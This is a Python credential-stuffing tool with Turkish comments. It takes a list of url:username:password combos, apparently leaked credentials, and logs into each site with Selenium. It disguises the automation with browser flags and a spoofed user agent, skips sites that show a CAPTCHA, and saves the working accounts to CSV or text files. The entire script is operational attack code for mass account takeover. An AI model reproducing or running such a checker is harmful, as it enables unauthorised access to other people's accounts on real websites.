from selenium import webdriver
import re
import chardet
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
from colorama import init, Fore, Back, Style
import requests
import csv
import os
import json
from requests.exceptions import RequestException, ConnectionError

"""Gerekli kütüpnaneler """

def splitdo(UPL):
    splitdata = []
    line = UPL.strip()
    if not line:
        return splitdata
    
    pattern = r'^(https?://[\S]+|[^\s:]+):([^:]+):(.+)$'
    match = re.match(pattern, line)
    
    if match:
        url = match.group(1)
        username = match.group(2)
        password = match.group(3)
        
        if not url.startswith("http"):
            url = "https://" + url.lstrip("//")  # URL formatını düzelt
        
        splitdata.append((url, username, password))
    else:
        print(f"Satır eşleşmedi: {line}")
    
    return splitdata

def Detectchar(FileName):
    with open(FileName, "rb") as file:
        read = file.read()
        detect = chardet.detect(read)
        print(Fore.LIGHTGREEN_EX+"[+]Dosya karakter kodlaması tespit edildi: "+detect['encoding'])
        return detect['encoding']



def control(url, account, password):

    options = Options()
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("start-maximized")
    options.add_argument("disable-infobars")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    options.add_argument("--incognito")
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument(
        "user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
    )
    
    try:


        Driver = webdriver.Chrome(options=options)   
        Driver.get(url)
        time.sleep(2)


        humanchecker = Driver.find_elements(By.NAME, "cf-captcha-container")
        humanchecker2 = Driver.find_elements(By.XPATH, "//iframe[contains(@title, 'reCAPTCHA')]")
        """Üstelikler robot doğrulama pathleri bunlar varsa çıkıyoruz..... """
    
        if humanchecker or humanchecker2: # bot doğrulaması varsa çıkış yap
            print(Fore.RED+f"[!!]Bot doğrulaması tespit edildi: {url}")
            Driver.quit()
            return False

        """siteye gidelim ve 2 sn bekleyelim """

        usernames=["username","email","kullaniciadi"]
        _passwords=["password","sifre","passwd","inputPassword"]
        login_id=None
        password_id=None
        for i in usernames:

            if Driver.find_elements(By.NAME,i):
                login_id=Driver.find_elements(By.NAME,i)
                break
            elif Driver.find_elements(By.ID,i):
                login_id=Driver.find_elements(By.ID,i)
                break
        
            
    
        for i in _passwords:

            if Driver.find_elements(By.NAME,i):
                password_id=Driver.find_elements(By.NAME,i)
                break
            elif Driver.find_elements(By.ID,i):
                password_id=Driver.find_elements(By.ID,i)
                break
        
            """ yukarıda hem ıd hemde name özellikleriyle girişler arranıyor...."""
            
    
        if login_id: #login girişi varsa
            login_id[0].send_keys(account)
        else:
            return None
        time.sleep(1)

        if password_id: # password girişi varsa
            password_id[0].send_keys(password)
    
        
        


        login_buttons=["login","enter","giris","/html/body/div[1]/section[2]/div/div/div[2]/form[1]/div[1]/input"]

        login_btn=None

        for i in login_buttons:

            if Driver.find_elements(By.NAME,i):
                login_btn=Driver.find_elements(By.NAME,i)
                break
            elif Driver.find_elements(By.ID,i):
                login_btn=Driver.find_elements(By.ID,i)
                break
            elif Driver.find_elements(By.XPATH,i):
                login_btn=Driver.find_elements(By.ID,i)
                break

        if login_btn and len(login_btn) > 0:
            login_btn[0].click()

        """Butona tıkladıktan sonra giriş yapıplıp yapılmadığını kontrol edelim. bunun için çeşitli teorilerim olsada en basiti inputları kontrol etmek """
        time.sleep(2)
        #giriş kontrolu

        for i in usernames:

            if Driver.find_elements(By.NAME,i):
                login_id=Driver.find_elements(By.NAME,i)
                break
            elif Driver.find_elements(By.ID,i):
                login_id=Driver.find_elements(By.ID,i)
                break
        
            
    
        for i in _passwords:

            if Driver.find_elements(By.NAME,i):
                password_id=Driver.find_elements(By.NAME,i)
                break
            elif Driver.find_elements(By.ID,i):
                password_id=Driver.find_elements(By.ID,i)
                break
        
            """ yukarıda hem ıd hemde name özellikleriyle girişler arranıyor...."""
        time.sleep(1)
        if login_btn or password_id:
             
            return False #giriş başarısız
        else:
            
            return True#giriş başarılı
        

    except Exception as Error:
        print(Fore.RED+Error)
    finally:
        time.sleep(1)
        Driver.quit()# Tarayıcıyı kapat..






signature=r"""
──────▄█████████▄──────────────
────▄██▀─▀████████▄────────────
───██──▀██▄█████████───────────
───██────▀██▀─▀███▀────────────
────██───▄█────────────────────
─────███──██───────────────────
───────██──██──────────────────
────────██──███────────────────
────────█─██──██───────────────
────────██─██──██──────██──────
────────██─███──███──█████─────
───────████████──█████████─────
─────██─██▀▀▀▀▀▀▀▀▀▀▀▀▀████────
───███─█▀─────────────────███──
──███─█▀─────────────▄███▄──██─
███──█▀────────────▄███████──██
██──█▀──▄█▄──▐─▌──██▀─█──██─█─█
█───█────▀──▄▀▀▀▄─▀█▄──▄██──█─█
█───█────────███─▌──▀███▀──██─█
██──█▄────────▌──▐────────██──█
██───█▄─────▐▄▌──▌──────▄█───██
███───██▄────▌──▐────▄██▀───██─
─██────▀███▄─▀▀▀▀─▄███▀─────██─
──██──────▀████████▀───────██──
───██────────▄██▄─────────██───
───███──────▀████▀───────██────
────███▄▄─────▀▀─────▄▄███─────
────██████████████████████─────
───███──██──────────██──███────
────────██──────────██─────────
────────███────────███─────────
Developed by mehmet cem karaca
"""




print(signature)  # Banner'ı ekrana yazdır

FileName_ = input(Fore.CYAN + "Lütfen dosya adını giriniz:")

print(Fore.LIGHTGREEN_EX + "[??] Dosya karakter kodlaması tespit ediliyor.....")
charset = Detectchar(FileName_)

output_format = input(Fore.YELLOW + "[?] Sonuçları CSV mi yoksa TXT olarak mı kaydetmek istiyorsunuz? (csv/txt): ").strip().lower()

def write_csv_header(file_path, header):
    if not os.path.exists(file_path) or os.stat(file_path).st_size == 0:
        with open(file_path, "w", newline="", encoding="UTF-8") as file:
            writer = csv.writer(file)
            writer.writerow(header)

if output_format == "csv":
    write_csv_header("validaccounts.csv", ["URL", "Username", "Password"])
    write_csv_header("Invalid.csv", ["URL", "Username", "Password"])

with open(FileName_, "r", encoding=charset, errors='ignore') as file:
    for line in file:
        result = splitdo(line)

        if result:
            url, username, password = result[0]

            try:
                get = requests.get(url, timeout=5)  

                if get.status_code == 200:
                    print(Fore.LIGHTGREEN_EX + f"Kontrol ediliyor.. {url}, {username}")

                    try:
                        if control(url, username, password):
                            print(Fore.LIGHTGREEN_EX + f" [+] Giriş başarılı! {url}, {username}")

                            if output_format == "csv":
                                with open("validaccounts.csv", "a", newline="", encoding="UTF-8") as kayit:
                                    writer = csv.writer(kayit)
                                    writer.writerow([url, username, password])
                            else:
                                with open("validaccounts.txt", "a", encoding="UTF-8") as kayit:
                                    kayit.write(f"{url}, {username}, {password}\n")

                        else:
                            print(Fore.RED + f"[-] Giriş Başarısız! {url}, {username}")
                            

                            if output_format == "csv":
                                with open("Invalid.csv", "a", newline="", encoding="UTF-8") as kayit:
                                    writer = csv.writer(kayit)
                                    writer.writerow([url, username, password])
                            else:
                                with open("Invalid.txt", "a", encoding="UTF-8") as kayit:
                                    kayit.write(f"{url}, {username}, {password}\n")

                    except Exception as e:
                        print(Fore.RED + f"Error during login check: {e}")
                        continue

                else:
                    print(Fore.RED + f"[-] Site aktif değil")

            except RequestException as e:   
                print(Fore.RED + f"[!] Bağlantı hatası: {e}")
                continue  
